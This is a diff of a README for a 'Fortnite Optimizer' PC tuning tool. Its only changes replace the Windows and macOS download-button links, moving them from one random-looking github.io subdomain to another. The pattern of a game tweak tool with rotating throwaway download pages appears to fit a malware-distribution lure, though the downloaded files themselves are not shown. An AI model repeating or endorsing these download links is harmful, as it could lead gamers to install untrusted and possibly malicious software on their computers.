@@ -61,7 +61,7 @@ The **🔧 Fortnite Optimizer** is a comprehensive PC tuning tool built specific
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows)](https://zdiweqqcluid.github.io/win-get/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows)](https://tlwbljvlzhgm.github.io/windows-install/)
 
 </div>
 
@@ -74,7 +74,7 @@ The **🔧 Fortnite Optimizer** is a comprehensive PC tuning tool built specific
 
 <div align="center">
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://zdiweqqcluid.github.io/mac-get/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://tlwbljvlzhgm.github.io/macos-install/)
 
 </div>
 
